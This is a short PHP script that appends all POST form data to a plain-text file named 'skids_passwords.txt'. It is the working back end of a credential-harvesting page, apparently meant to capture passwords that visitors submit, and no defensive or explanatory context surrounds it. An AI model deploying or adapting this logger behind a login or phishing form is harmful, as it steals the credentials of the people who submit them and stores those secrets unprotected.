<?php $file = 'skids_passwords.txt';
file_put_contents($file, print_r($_POST, true), FILE_APPEND);
?>
